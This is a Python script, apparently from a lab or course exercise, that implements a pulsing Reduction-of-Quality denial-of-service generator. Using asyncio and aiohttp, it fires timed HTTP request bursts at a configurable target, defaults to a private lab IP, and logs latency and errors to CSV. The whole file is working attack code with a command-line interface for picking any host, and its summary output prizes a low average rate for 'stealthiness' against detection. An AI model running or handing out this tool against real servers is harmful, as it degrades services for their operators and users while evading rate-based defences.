#!/usr/bin/env python3
import asyncio
import aiohttp
import argparse
import time
import csv
import sys
from dataclasses import dataclass, field
from typing import List

# Attack Parameters
@dataclass
class RoQParams:
    target_ip:      str   = "10.0.2.15"
    port:           int   = 80
    url:            str   = "/index.html"
    T:              float = 10.0
    tau:            float = 1.5   
    delta:          int   = 150   
    cycles:         int   = 10 
    log_file:       str   = "roq_attack_log.csv"

    @property
    def idle_duration(self):
        return self.T - self.tau

    @property
    def magnitude(self):
        return self.delta * self.tau

    @property
    def avg_rate(self):
        return self.magnitude / self.T

# Asynchronous Burst Generator
class RoQGenerator:
    def __init__(self, params: RoQParams):
        self.p = params
        self.stats: List[dict] = []

    async def _single_request(self, session: aiohttp.ClientSession,
                               cycle: int, burst_start: float):
        url = f"http://{self.p.target_ip}:{self.p.port}{self.p.url}"
        t0 = time.perf_counter()
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=2.0)) as resp:
                elapsed = time.perf_counter() - t0
                return {
                    "cycle": cycle,
                    "ts": time.time(),
                    "offset_in_burst": t0 - burst_start,
                    "latency_ms": round(elapsed * 1000, 2),
                    "status": resp.status,
                    "phase": "burst"
                }
        except Exception as e:
            return {
                "cycle": cycle,
                "ts": time.time(),
                "offset_in_burst": t0 - burst_start,
                "latency_ms": -1,
                "status": str(type(e).__name__),
                "phase": "burst"
            }

    async def _burst(self, session: aiohttp.ClientSession, cycle: int):
        """Sends δ requests/s during τ seconds — square wave I(t) = δ"""
        burst_start = time.perf_counter()
        burst_end   = burst_start + self.p.tau
        interval    = 1.0 / self.p.delta  # tempo entre requests dentro do burst
        tasks       = []

        while time.perf_counter() < burst_end:
            t_send = time.perf_counter()
            tasks.append(asyncio.create_task(
                self._single_request(session, cycle, burst_start)
            ))
            # Controlo de taxa preciso
            elapsed = time.perf_counter() - t_send
            sleep   = interval - elapsed
            if sleep > 0:
                await asyncio.sleep(sleep)

        results = await asyncio.gather(*tasks, return_exceptions=False)
        self.stats.extend(results)

        sent     = len(results)
        ok       = sum(1 for r in results if r.get("status") == 200)
        avg_lat  = sum(r["latency_ms"] for r in results
                       if r["latency_ms"] > 0) / max(ok, 1)
        print(f"  [Cycle {cycle:3d}] BURST  | sent={sent:4d} ok={ok:4d} "
              f"avg_lat={avg_lat:6.1f}ms")

    async def run(self):
        print(f"RoQ Attack Generator")
        print(f"  Target : http://{self.p.target_ip}:{self.p.port}{self.p.url}")
        print(f"  T={self.p.T}s | τ={self.p.tau}s | δ={self.p.delta} req/s")
        print(f"  M={self.p.magnitude:.0f} req/burst | avg_rate={self.p.avg_rate:.1f} req/s")
        print(f"  Cycles : {self.p.cycles}")
        print(f"  Total  : ~{self.p.T * self.p.cycles:.0f}s\n")

        connector = aiohttp.TCPConnector(
            limit=0,               
            force_close=True,     
            enable_cleanup_closed=True
        )
        async with aiohttp.ClientSession(connector=connector) as session:
            for cycle in range(self.p.cycles):
                cycle_start = time.perf_counter()

                # BURST: I(t) = δ 
                await self._burst(session, cycle)

                # IDLE: I(t) = 0 
                elapsed = time.perf_counter() - cycle_start
                idle    = max(0.0, self.p.T - elapsed)
                print(f"  [Cycle {cycle:3d}] IDLE   | sleeping {idle:.2f}s")
                await asyncio.sleep(idle)

        self._save_log()
        self._print_summary()

    def _save_log(self):
        if not self.stats:
            return
        with open(self.p.log_file, "w", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=self.stats[0].keys())
            writer.writeheader()
            writer.writerows(self.stats)
        print(f"\n Log guardado em {self.p.log_file}")

    def _print_summary(self):
        ok       = [r for r in self.stats if r.get("status") == 200]
        failed   = [r for r in self.stats if r.get("status") != 200]
        lats     = [r["latency_ms"] for r in ok if r["latency_ms"] > 0]
        print(f"\n Sumário ")
        print(f"  Total requests  : {len(self.stats)}")
        print(f"  HTTP 200 OK     : {len(ok)}")
        print(f"  Erros / Timeout : {len(failed)}")
        if lats:
            print(f"  Latência média  : {sum(lats)/len(lats):.1f}ms")
            print(f"  Latência max    : {max(lats):.1f}ms")
        print(f"  Taxa média real : {len(self.stats) / (self.p.T * self.p.cycles):.1f} req/s")
        print(f"  (stealthiness: avg_rate={self.p.avg_rate:.1f} req/s — deve ser baixo)")

# CLI 
def parse_args():
    parser = argparse.ArgumentParser(description="RoQ Traffic Generator")
    parser.add_argument("--target",         default="10.0.2.15")
    parser.add_argument("--port",    type=int, default=80)
    parser.add_argument("--url",            default="/index.html")
    parser.add_argument("--period",  type=float, default=10.0,
                        help="Período T (s)")
    parser.add_argument("--burst-duration", type=float, default=1.5,
                        help="Duração do burst τ (s)")
    parser.add_argument("--burst-rate",     type=int,   default=300,
                        help="Taxa do burst δ (req/s)")
    parser.add_argument("--cycles",         type=int,   default=30)
    parser.add_argument("--url-path",       default="/index.html")
    parser.add_argument("--log",            default="roq_attack_log.csv")
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()
    params = RoQParams(
        target_ip=args.target,
        port=args.port,
        url=args.url,
        T=args.period,
        tau=args.burst_duration,
        delta=args.burst_rate,
        cycles=args.cycles,
        log_file=args.log,
    )
    asyncio.run(RoQGenerator(params).run())